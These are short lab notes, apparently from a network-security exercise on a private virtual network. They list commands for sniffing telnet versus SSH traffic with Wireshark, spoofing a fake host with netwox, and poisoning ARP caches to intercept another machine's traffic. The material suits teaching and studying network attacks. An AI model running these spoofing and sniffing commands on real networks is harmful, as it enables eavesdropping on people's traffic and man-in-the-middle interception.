#Eavesdropping

#Machine 2
ssh 192.168.56.103
ls
exit
#Machine 1
sudo wireshark
#Machine 3
sudo apt-get install xinetd telnetd
/etc/init.d/xinetd restart
#Machine 2
telnet 192.168.56.103 23
ls
exit

#Fake machine:

#Machine 2
ping 192.168.56.103
ping 192.168.56.104
#Machine 1
sudo netwox 73 -i 192.168.56.104 -e 08:00:27:cd:cf:f6 -d Eth1
#Machine 2
ping 192.168.56.104

#Attacker:

#Machine 1
sudo netwox 33 -d Eth1 -a 08:00:27:cd:cf:f6 -b 08:00:27:78:c8:72 -c 2054 -e 2 -f 08:00:27:cd:cf:f6 -g 192.168.56.103 -h 08:00:27:78:c8:72 -i 192.168.56.102
sudo netwox 73 -i 192.168.56.103 -e 08:00:27:cd:cf:f6 -d Eth1
#Machine 2
ping 192.168.56.103
